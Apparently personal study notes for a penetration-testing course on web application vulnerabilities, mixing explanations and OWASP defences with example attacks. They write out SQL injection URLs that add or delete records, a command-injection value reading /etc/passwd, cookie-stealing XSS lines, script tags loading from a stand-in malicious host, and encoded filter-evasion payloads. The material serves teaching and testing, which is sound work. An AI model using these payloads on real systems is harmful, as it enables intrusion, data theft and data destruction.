 A REST API (or **_RESTful API_**) is a type of application programming interface (API) that conforms to the specification of the representational state transfer (REST) architectural style and allows for interaction with web services. REST APIs are used to build and integrate multiple-application software. In short, if you want to interact with a web service to retrieve information or add, delete, or modify data, an API helps you communicate with such a system in order to fulfill the request. REST APIs use JSON as the standard format for output and requests. SOAP is an older technology used in legacy APIs that use XML instead of JSON. **_Extensible Markup Language Remote Procedure Call (XML-RPC)_** is a protocol in legacy applications that uses XML to encode its calls and leverages HTTP as a transport mechanism.

The HTTP status code messages can be in the following ranges:

- Messages in the 100 range are informational.
- Messages in the 200 range are related to successful transactions.
- Messages in the 300 range are related to HTTP redirections.
- Messages in the 400 range are related to client errors.
- Messages in the 500 range are related to server errors.
#lookup 
> As a practice exercise, use curl to create a connection to the web.h4cker.org website. Try to change the version to HTTP 2.0 and use Wireshark. Can you see the difference between the versions of HTTP in a packet capture? See [_https://curl.haxx.se/docs/http2.html_](https://curl.haxx.se/docs/http2.html) for curl documentation.


A _web session_ is a sequence of HTTP request and response transactions between a web client and a server. These transactions include pre-authentication tasks, the authentication process, session management, access control, and session finalization. Numerous web applications keep track of information about each user for the duration of a web transaction.

#lookup 
>A good resource that provides a lot of information about application authentication is the OWASP Authentication Cheat Sheet, available at [_https://www.owasp.org/index.php/Authentication_Cheat_Sheet_](https://www.owasp.org/index.php/Authentication_Cheat_Sheet).

The session ID names used by the most common web application development frameworks can be easily fingerprinted. For instance, you can easily fingerprint PHPSESSID (PHP), JSESSIONID (J2EE), CFID and CFTOKEN (ColdFusion), ASP.NET_SessionId (ASP.NET), and many others. In addition, the session ID name may indicate what framework and programming languages are used by the web application.

It is recommended to change the default session ID name of the web development framework to a generic name, such as **id**.

The session ID must be long enough to prevent brute-force attacks. Sometimes developers set it to just a few bits, though it must be at least 128 bits (16 bytes).

#lookup 
>Nikto, It is a great tool, and you may want to add it to your penetration testing toolbox.


 Nmap.org has a website set up to test Nmap scans. You will use this web server to perform your first vulnerability scan. Launch Firefox and navigate to the [**http://scanme.nmap.org**](http://scanme.nmap.org/) website. Read the description of the server and the restrictions that are placed on it.

Nikto provides some information about the vulnerabilities that it uncovers during its scans. Some vulnerabilities are associated with an OSVDB number (an older Open Source Vulnerability Database), a CWE [(Common Weakness Enumeration](https://cwe.mitre.org/about/)), or a CVE ([Common Vulnerabilities and Exposures](https://cve.mitre.org/)). OSVDB was discontinued in 2016. You can use the CVE reference tool to translate the OSVDB identifier to a CVE entry so you can research the vulnerability further.

Use the National Vulnerability Database ([https://nvd.nist.gov](https://nvd.nist.gov/)) to find additional information on the CVEs

 Some people get confused about the relationship between the popular OpenVas tool and GVM. OpenVas is a component of GVM that is launched through the GVM interface.

1. To access the Metasploitable target to exploit the rexec vulnerability, you will need a remote shell client. Use apt-get to install a remote shell (RSH) client on the Kali Linux VM.
2. 2. Attempt to log in to the Metasploitable target with the username **msfadmin** using **RSH**. The syntax for the **rsh** command is **rsh -l** [_username_] [_target IP or hostname_]
```sh
rsh -l msfadmin 172.17.0.2
```
**_Business logic flaws_** enable an attacker to use legitimate transactions and flows of an application in a way that results in a negative behavior or outcome. Most common business logic problems are different from the typical security vulnerabilities in an application (such as XSS, CSRF, and SQL injection). A challenge with business logic flaws is that they can’t typically be found by using scanners or other similar tools.

OWASP offers recommendations on how to test and protect against business logic attacks at [_https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation_](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation).



MITRE has assigned Common Weakness Enumeration (CWE) ID 840 (CWE-840) to business logic errors. You can obtain detailed information about CWE-840 at [_https://cwe.mitre.org/data/definitions/840.html_](https://cwe.mitre.org/data/definitions/840.html). That website also provides several granular examples of business logic flaws including the following:

- Unverified ownership
- Authentication bypass using an alternate path or channel
- Authorization bypass through user-controlled key
- Weak password recovery mechanism for forgotten password
- Incorrect ownership assignment
- Allocation of resources without limits or throttling
- Premature release of resource during expected lifetime
- Improper enforcement of a single, unique action
- Improper enforcement of a behavioral workflow

# Sql-injection
Typically, SQL statements are divided into the following categories:

- Data definition language (DDL) statements
- Data manipulation language (DML) statements
- Transaction control statements
- Session control statements
- System control statements
- Embedded SQL statements

#lookup 
>The W3Schools website has a tool called the Try-SQL Editor that allows you to practice using SQL statements in an “online database” (see [_https://www.w3schools.com/sql/trysql.asp?filename=trysql_select_all_](https://www.w3schools.com/sql/trysql.asp?filename=trysql_select_all) ). You can use this tool to become familiar with SQL statements and how they may be passed to an application. Another good online resource that explains SQL queries in detail is [_https://www.geeksforgeeks.org/sql-ddl-dml-tcl-dcl_](https://www.geeksforgeeks.org/sql-ddl-dml-tcl-dcl).

**SQL Injection Categories**

SQL injection attacks can be divided into the following categories:

- **In-band SQL injection:** With this type of injection, the attacker obtains the data by using the same channel that is used to inject the SQL code. This is the most basic form of an SQL injection attack, where the data is dumped directly in a web application (or web page).
- **Out-of-band SQL injection:** With this type of injection, the attacker retrieves data using a different channel. For example, an email, a text, or an instant message could be sent to the attacker with the results of the query; or the attacker might be able to send the compromised data to another system.
- **Blind (or inferential) SQL injection:** With this type of injection, the attacker does not make the application display or transfer any data; rather, the attacker is able to reconstruct the information by sending specific statements and discerning the behaviour of the application and database.
To perform an SQL injection attack, an attacker must craft a syntactically correct SQL statement (query). The attacker may also take advantage of error messages coming back from the application and might be able to reconstruct the logic of the original query to understand how to execute the attack correctly. If the application hides the error details, the attacker might need to reverse engineer the logic of the original query.

There are essentially five techniques that can be used to exploit SQL injection vulnerabilities:

- **Union operator:** This is typically used when an SQL injection vulnerability allows a **SELECT** statement to combine two queries into a single result or a set of results.
- **Boolean:** This is used to verify whether certain conditions are true or false.
- **Error-based technique:** This is used to force the database to generate an error in order to enhance and refine an attack (injection).
- **Out-of-band technique:** This is typically used to obtain records from the database by using a different channel. For example, it is possible to make an HTTP connection to send the results to a different web server or a local machine running a web service.
- **Time delay:** It is possible to use database commands to delay answers. An attacker may use this technique when he or she doesn’t get output or error messages from the application.

SQL injection can also be exploited by manipulating a URL query string, as demonstrated here:
```
https://store.h4cker.org/buystuff.php?id=99 AND 1=2
```


This vulnerable application then performs the following SQL query:
```sql
SELECT * FROM products WHERE product_id=99 AND 1=2

```
The attacker may then see a message specifying that there is no content available or a blank page. The attacker can then send a valid query to see if there are any results coming back from the application, as shown here:
```
https://store.h4cker.org/buystuff.php?id=99 AND 1=1
```

Some web application frameworks allow multiple queries at once. An attacker can take advantage of that capability to perform additional exploits, such as adding records. The following statement, for example, adds a new user called **omar** to the users table of the database:
```
https://store.h4cker.org/buystuff.php?id=99; INSERT INTO users(username) VALUES ('omar')
```
**The UNION Exploitation Technique**

The SQL **UNION** operator is used to combine the result sets of two or more **SELECT** statements, as shown here:

  SELECT zipcode FROM h4cker_customers
UNION
SELECT zipcode FROM h4cker_suppliers;

By default, the **UNION** operator selects only distinct values. You can use the **UNION ALL** operator if you want to allow duplicate values.

**Booleans in SQL Injection Attacks**

The Boolean technique is typically used in blind SQL injection attacks. In blind SQL injection vulnerabilities, the vulnerable application typically does not return an SQL error, but it could return an HTTP 500 message, a 404 message, or a redirect. It is possible to use Boolean queries against an application to try to understand the reason for such error codes.

**Out-of-Band Exploitation**
The out-of-band exploitation technique is very useful when you are exploiting a blind SQL injection vulnerability. You can use database management system (DBMS) functions to execute an out-of-band connection to obtain the results of the blind SQL injection attack. Figure 6-13 shows how an attacker could exploit a blind SQL injection vulnerability at store.h4cker.org and then force the victim server to send the results of the query (compromised data) to another server (malicious.h4cker.org).

he following are examples of injection-based vulnerabilities that are discussed in the following sections:

- SQL injection vulnerabilities
- HTML injection vulnerabilities
- Command injection vulnerabilities
- Lightweight Directory Access Protocol (LDAP) injection vulnerabilities
![[Pasted image 20251111172343.png]]

![[Pasted image 20251111172545.png]]

 A stacked query attack can execute any SQL statement or procedure sequentially. In this case, the attacker tries deleting valid users from the IT_Admins table.
 ```sql
 SELECT * FROM IT_Admins WHERE customer_id=1; DELETE FROM IT_Admins
 ```
 
 A **_command injection_** is an attack in which an attacker tries to execute commands that he or she is not supposed to be able to execute on a system via a vulnerable application. Command injection attacks are possible when an application does not validate data supplied by the user (for example, data entered in web forms, cookies, HTTP headers, and other elements). The vulnerable system passes that data into a system shell.
 ```
 198.51.100.5;cat /etc/passwd
 ```
 
OWASP provides a good explanation of how command injection works at [_https://www.owasp.org/index.php/Command_Injection_](https://www.owasp.org/index.php/Command_Injection).

_LDAP injection vulnerabilities_ are input validation vulnerabilities that an attacker uses to inject and execute queries to LDAP servers. A successful **_LDAP injection_** attack can allow an attacker to obtain valuable information for further attacks on databases and internal applications.

Similar to SQL injection and other injection attacks, LDAP injection attacks leverage vulnerabilities that occur when an application inserts unsanitized user input (that is, input that is not validated) directly into an LDAP statement. By sending crafted LDAP packets, attackers can cause the LDAP server to execute a variety of queries and other LDAP statements. LDAP injection vulnerabilities could, for example, allow an attacker to modify the LDAP tree and modify business-critical information.

There are two general types of LDAP injection attacks:

- **Authentication bypass:** The most basic LDAP injection attacks are launched to bypass password and credential checking.
- **Information disclosure:** An attacker could inject crafted LDAP packets to list all resources in an organization’s directory and perform reconnaissance.

Damn Vulnerable Web Application (DVWA) is a PHP/MariaDB web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.
https://github.com/digininja/DVWA

## Auth based vulnerabilities
An attacker can bypass authentication in vulnerable systems by using several methods. The following are the most common ways to take advantage of authentication-based vulnerabilities in an affected system:

- Credential brute forcing
- Session hijacking
- Redirecting
- Exploiting default credentials
- Exploiting weak credentials
- Exploiting Kerberos

A good resource that provides a lot of information about application authentication is the OWASP Authentication Cheat Sheet, available at [_https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html_](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html).

The session ID names used by the most common web application development frameworks can be easily fingerprinted. For example, it is possible to easily fingerprint these development frameworks and languages by using the following session ID names:

- **PHP:** PHPSESSID
- **J2EE:** JSESSIONID
- **ColdFusion:** CFID and CFTOKEN
- **ASP.NET:** ASP.NET_SessionId

Sometimes the session ID is included in the URL. This dangerous practice can lead to the manipulation of the ID or session fixation attacks.

Configuring a cookie with the **HTTPOnly** flag forces the web browser to have this cookie processed only by the server, and any attempt to access the cookie from client-based code or scripts is strictly forbidden. This protects against several type of attacks, including CSRF.

 Modern applications typically track users after authentication by using non-persistent cookies. This forces the session information to be deleted from the client if the current web browser instance is closed. It is important to use non-persistent cookies so the session ID does not remain in the web client cache for long periods of time. In addition, this is why it is important to validate and verify session IDs,
 If web applications do not validate and filter out invalid session ID values, they can potentially be used to exploit other web vulnerabilities, such as SQL injection (if the session IDs are stored on a relational database) or persistent XSS (if the session IDs are stored and reflected back afterward by the web application).

To protect against session hijacking, you should verify that the developers have:

- changed the default session ID name of the web development framework to the generic name
- ensured that the session ID is long enough to prevent brute-force attacks; the session ID must be at least 128 bits long.
- ensured that the session ID is unique and unpredictable
- used a cryptographically secure pseudorandom number generator (PRNG) for the session ID

Attackers can easily obtain default passwords and identify Internet-connected target systems. Passwords can be found in product documentation and compiled lists available on the Internet. An example is [_http://www.defaultpassword.com_](http://www.defaultpassword.com/), but there are dozens of other sites that contain default passwords and configurations on the Internet. It is easy to identify devices that have default passwords and that are exposed to the Internet by using search engines such as Shodan ([_https://www.shodan.io_](https://www.shodan.io/)).
![[Pasted image 20251111181053.png]]

- Investigate Password Attacks
- Crack Hashes with Hashcat Dictionary Attacks
-  Crack Hashes with John the Ripper Using Dictionary and Brute Force Attacks
- Crack Hashes using RainbowCrack and Rainbow Tables


Two of the most common authorization-based vulnerabilities are parameter pollution and Insecure Direct Object Reference vulnerabilities. The following sections provide details about these vulnerabilities.


HTTP parameter pollution (HPP) vulnerabilities can be introduced if multiple HTTP parameters have the same name. This issue may cause an application to interpret values incorrectly. An attacker may take advantage of HPP vulnerabilities to bypass input validation, trigger application errors, or modify internal variable values.
#lookup 
>The **_OWASP Zed Attack Proxy (ZAP)_** tool can be very useful in finding HPP vulnerabilities. You can download it from [_https://github.com/zaproxy/zaproxy_](https://github.com/zaproxy/zaproxy). You will learn more about the OWASP ZAP tool later in this module and in Module 10.

Insecure Direct Object Reference vulnerabilities can be exploited when web applications allow direct access to objects based on user input. Successful exploitation could allow attackers to bypass authorization and access resources that should be protected by the system (for example, database records, system files). This type of vulnerability occurs when an application does not sanitize user input and does not perform appropriate authorization checks.

Let’s go over a few examples on how to take advantage of this type of vulnerability. The following example shows how the value of a parameter can be used directly to retrieve a database record:

https://store.h4cker.org/buy?customerID=1188

In this example, the value of the **customerID** parameter is used as an index in a table of a database holding customer contacts. The application takes the value and queries the database to obtain the specific customer record. An attacker may be able to change the value **1188** to another value and retrieve another customer record.

In the following example, the value of a parameter is used directly to execute an operation in the system:

https://store.h4cker.org/changepassd?user=omar

In this example, the value of the user parameter (**omar**) is used to have the system change the user’s password. An attacker can try other usernames and see if it is possible to modify the password of another user.

#tip
>HTTP parameter pollution and Insecure Direct Object Reference are authorization-based vulnerabilities. Kerberos weakness, session hijacking, and default credentials are authentication-based vulnerabilities.

### Understanding Cross-Site Scripting (XSS) Vulnerabilities
Cross-site scripting (XSS) is a type of injection attack in which web applications accept malicious scripts that are often appended to a URL or inserte

**_Cross-site scripting_** **_(XSS)_** vulnerabilities, which have become some of the most common web application vulnerabilities, are achieved using the following attack types:

- Reflected XSS
- Stored (persistent) XSS
- DOM-based XSS

You typically find XSS vulnerabilities in the following:

- Search fields that echo a search string back to the user
- HTTP headers
- Input fields that echo user data
- Error messages that return user-supplied text
- Hidden fields that may include user input data
- Applications (or websites) that display user-supplied data
```js
The following example shows an XSS test that can be performed from a browser’s address bar:

  javascript:alert("Omar_s_XSS test");
javascript:alert(document.cookie);

The following example shows an XSS test that can be performed in a user input field in a web form:

<script>alert("XSS Test")</script>
```
Attackers can use obfuscation techniques in XSS attacks by encoding tags or malicious portions of the script using Unicode so that the link or HTML content is disguised to the end user browsing the site.

#lookup 
>You can practice XSS scenarios with WebGoat. You can easily test a reflected XSS attack by using the following link:
>http://**localhost**:8080/WebGoat/CrossSiteScripting/attack5a?QTY1=1&QTY2=1&QTY3=1&QTY4=1&field1=4128+3214+0002  
+1999&field2=111
Replace **localhost** with the hostname or IP address of the system running WebGoat.

Reflected cross-site scripting (XSS) attacks occur when malicious code or scripts are injected by a vulnerable web application using any method that yields a response as part of a valid HTTP request. An example of a reflected XSS attack is when a user follows a malicious link to a vulnerable server that injects (reflects) the malicious code back into the user's browser, causing the browser to execute the code or script.

The Document Object Model (DOM) is a cross-platform and language-independent application programming interface that treats an HTML, XHTML, or XML document as a tree structure. DOM-based attacks are typically reflected XSS attacks that are triggered by sending a link with inputs that are reflected to the web browser. In DOM-based XSS attacks, the payload is never sent to the server. Instead, the payload is only processed by the web client (browser).

DOM-based applications use global variables to manage client-side information. Often developers create unsecured applications that put sensitive information in the DOM (for example, tokens, public profile URLs, private URLs for information access, cross-domain OAuth values, and even user credentials as variables). It is a best practice to avoid storing any sensitive information in the DOM when building web applications.

As part of the Pixel Paradise pentest, you have visited their product review site and successfully posted the following message:

_Warlocks of Wonder is the greatest game of its type ever made!  
```
<script src=”https://203.0.113.17/protego_test.js”> </script>_

```

The script creates logfile entries on a Protego server every time a visitor to the reviews page triggers the script. You immediately start to see entries in the log. What exploit have you created on the Pixel Paradise web site?

Stored cross-site scripting attack (XSS) attacks occur when malicious code or scripts are permanently stored on a vulnerable or malicious server using a database. These attacks are typically carried out on websites hosting blog posts, web forums, and other permanent storage methods.

### XSS Evasion Techniques
Numerous techniques can be used to evade XSS protections and security products such as web application firewalls (WAFs).
 let’s take a look at an XSS JavaScript injection that would be detected by most XSS filters and security solutions:

```
<SCRIPT SRC=http://malicious.h4cker.org/xss.js></SCRIPT>
```
 the following examples shows how the html img tag can be used in several ways to potentially evade xss filters:
```
<img src="javascript:alert('xss');">
<img src=javascript:alert('xss')>
<img src=javascript:alert(&quot;XSS&quot;)>
<img src=javascript:alert('xss')>
```
It is also possible to use other malicious HTML tags (such as tags), as demonstrated here:

  <a onmouseover="alert(document.cookie)">This is a malicious link</a>
<a onmouseover=alert(document.cookie)>This is a malicious link</a>

An attacker may also use a combination of hexadecimal HTML character references to potentially evade XSS filters, as demonstrated here:

```xml
  <img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&
#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

US ASCII encoding may bypass many content filters and can also be used as an evasion technique, but it works only if the system transmits in US ASCII encoding or if it is manually set. This technique is useful against WAFs. The following example demonstrates the use of US ASCII encoding to evade WAFs:
```
¼script¾alert(¢XSS¢)¼/script¾
```
The following example shows an example of an evasion technique that involves using the HTML **embed** tags to embed a Scalable Vector Graphics (SVG) file:
```xml
  <EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH
A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcm
cvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3
hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaW
dodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdC
I+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" 
AllowScriptAccess="always"></EMBED>
```

#lookup 
>The OWASP XSS Filter Evasion Cheat Sheet ([_https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet_](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)) includes dozens of additional examples of evasion techniques. You can access numerous XSS evasion technique vectors at my GitHub repository, at [_https://github.com/The-Art-of-Hacking/h4cker/blob/master/web_application_testing/xss_vectors.md_](https://github.com/The-Art-of-Hacking/h4cker/blob/master/web_application_testing/xss_vectors.md).

The following are general rules for preventing XSS attacks, according to OWASP:

- Use an auto-escaping template system.
- Never insert untrusted data except in allowed locations.
- Use HTML escape before inserting untrusted data into HTML element content.
- Use attribute escape before inserting untrusted data into HTML common attributes.
- Use JavaScript escape before inserting untrusted data into JavaScript data values.
- Use CSS escape and strictly validate before inserting untrusted data into HTML-style property values.
- Use URL escape before inserting untrusted data into HTML URL parameter values.
- Sanitize HTML markup with a library such as ESAPI to protect the underlying application.
- Prevent DOM-based XSS by following OWASP’s recommendations at [_https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html_.](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- Use the **HTTPOnly** cookie flag.
- Implement content security policy.
- Use the **X-XSS-Protection** response header.

You should also convert untrusted input into a safe form, where the input is displayed as data to the user. This prevents the input from executing as code in the browser. To do this, perform the following HTML entity encoding:

- Convert **_&_** to `**&amp;.`**
- Convert **_<_** to `**&lt;**.`
- Convert **_>_** to `**&gt;.`**
- Convert **_“_** to `**&quot;.`**
- Convert **_“_** to `**&#x27;.`**
- Convert **_/_** to `**&#x2F;.`**

The following are additional best practices for preventing XSS attacks:

- Escape all characters (including spaces but excluding alphanumeric characters) with the HTML entity **&#xHH;** format (where **HH** is a hex value).
- Use URL encoding only, not the entire URL or path fragments of a URL, to encode parameter values.
- Escape all characters (except for alphanumeric characters), with the **\uXXXX**
Unicode escaping format (where **X** is an integer).- CSS escaping supports **\XX** and **\XXXXXX**, so add a space after the CSS escape or use the full amount of CSS escaping possible by zero-padding the value.
- Educate users about safe browsing to reduce their risk of falling victim to XSS attacks.

XSS controls are now available in modern web browsers.

#lookup 
>One of the best resources that lists several mitigations against XSS attacks and vulnerabilities is the OWASP Cross-Site Scripting Prevention Cheat Sheet, available at [_https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html_](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

# Cross-Site Request Forgery (CSRF/XSRF)

Cross-site request forgery (CSRF) is a way that attackers can leverage the trust granted to a logged-in user at one site to execute code from a malicious site. It sounds complicated, I know. Unfortunately, this type of attack can be used against users of financial websites, for example, to transfer money to a hacker’s account without the user’s knowledge. It can also be used to make unauthorized purchases from ecommerce sites. Because of the possibility for lost money, it is essential to test for this vulnerability. Many vulnerability and code scanners have automated tests that are effective.


CSRF attacks typically affect applications (or websites) that rely on a user’s identity. Attackers can trick the user’s browser into sending HTTP requests to a target website. An example of a CSRF attack is a user authenticated by the application through a cookie saved in the browser unwittingly sending an HTTP request to a site that trusts the user, subsequently triggering an unwanted action.

_Clickjacking_ involves using multiple transparent or opaque layers to induce a user into clicking on a web button or link on a page that he or she was not intended to navigate or click. Clickjacking attacks are often referred to as _UI redress attacks_. User keystrokes can also be hijacked using clickjacking techniques. An attacker can launch a clickjacking attack by using a combination of CSS stylesheets, iframes, and text boxes to fool the user into entering information or clicking on links in an invisible frame that can be rendered from a site the attacker created.
The OWASP Clickjacking Defense Cheat Sheet provides additional details about how to defend against clickjacking attacks. The cheat sheet can be accessed at [_https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet_](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet).

A **_directory traversal_** vulnerability (often referred to as _path traversal_ ) can allow attackers to access files and directories that are stored outside the web root folder.

_Cookie manipulation attacks_ are often referred to as _stored DOM-based attacks_ (or _vulnerabilities_ ). Cookie manipulation is possible when vulnerable applications store user input and then embed that input in a response within a part of the DOM. This input is later processed in an unsafe manner by a client-side script. An attacker can use a JavaScript string (or other scripts) to trigger the DOM-based vulnerability. Such scripts can write controllable data into the value of a cookie.

# File instruction vulnerabilities


A local file inclusion (LFI) vulnerability occurs when a web application allows a user to submit input into files or upload files to the server.

Remote file inclusion (RFI) vulnerabilities are similar to LFI vulnerabilities. However, when an attacker exploits an RFI vulnerability, instead of accessing a file on the victim, the attacker is able to execute code hosted on his or her own system (the attacking system).

Often developers include information in source code that could provide too much information and might be leveraged by an attacker. For example, they might provide details about a system password, API credentials, or other sensitive information that an attacker could find and use.

MITRE created a standard called the Common Weakness Enumeration (CWE). The CWE lists identifiers that are given to security malpractices or the underlying weaknesses that introduce vulnerabilities. CWE-615, “Information Exposure Through Comments ”, covers the flaw described in this section. You can obtain details about CWE-615 at [_https://cwe.mitre.org/data/definitions/615.html_](https://cwe.mitre.org/data/definitions/615.html).

OWASP provides detailed examples of improper error handling at [_https://owasp.org/www-community/Improper_Error_Handling_](https://owasp.org/www-community/Improper_Error_Handling). OWASP also provides a cheat sheet that discusses how to find and prevent error handling vulnerabilities; see [_https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html_](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html).

Improper error handling can provide information that helps attackers. Error messages such as error codes, database dumps, and stack traces can provide valuable information to an attacker, such as information about application flaws and the type and version of  server software, the frameworks in use, and database type and version. When penetration testing web applications, it is useful to force errors to get an understanding of the error handling practices that were included in the code.

A _race condition_ occurs when a system or an application attempts to perform two or more operations at the same time. However, due to the nature of such a system or application, the operations must be done in the proper sequence in order to be done correctly. When an attacker exploits such a vulnerability, he or she has a small window of time between when a security control takes effect and when the attack is performed. The attack complexity in race conditions is very high. In other words, race conditions are very difficult to exploit.

When performing pen testing against an API, it is important to collect full requests by using a proxy such as Burp Suite or OWASP ZAP. (You will learn more about these tools in Module 10.) It is important to make sure that the proxy is able to collect full API requests and not just URLs because REST, SOAP, and other API services use more than just **GET** parameters.

“Fuzz testing or Fuzzing is an unknown environment/black box software testing technique, which basically consists in finding implementation bugs using malformed/semi-malformed data injection in an automated fashion.”

OWASP has a REST Security Cheat Sheet that provides numerous best practices on how to secure RESTful (REST) APIs. See [_https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html_](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html).

The following are several general best practices and recommendations for securing APIs:

- Secure API services to provide HTTPS endpoints with only a strong version of TLS.
- Validate parameters in the application and sanitize incoming data from API clients.
- Explicitly scan for common attack signatures; injection attacks often betray themselves by following common patterns.
- Use strong authentication and authorization standards.
- Use reputable and standard libraries to create the APIs.
- Segment API implementation and API security into distinct tiers; doing so frees up the API developer to focus completely on the application domain.
- Identify what data should be publicly available and what information is sensitive.
- If possible, have a security expert do the API code verification.
- Make internal API documentation mandatory.
- Avoid discussing company API development (or any other application development) on public forums.

_Code signing_ (or _image signing_) involves adding a digital signature to software and applications to verify that the application, operating system, or any software has not been modified since it was signed. Many applications are still not digitally signed today, which means attackers can easily modify and potentially impersonate legitimate applications.

Subresource Integrity (SRI) is a security feature that allows you to provide a hash of a file fetch by a web browser (client). SRI verifies file integrity and ensures that files are delivered without any tampering or manipulation by an attacker.

#lookup 
>- **gobuster:** This tool, which is similar to DirBuster, is written in Go. You can download gobuster from [_https://github.com/OJ/gobuster_](https://github.com/OJ/gobuster)
>- **ffuf:** This very fast web fuzzer is also written in Go. You can download ffuf from [_https://github.com/ffuf/ffuf_](https://github.com/ffuf/ffuf).
>- **feroxbuster:** This web application reconnaissance fuzzer is written in Rust. You can download feroxbuster from [_https://github.com/epi052/feroxbuster_](https://github.com/epi052/feroxbuster).






















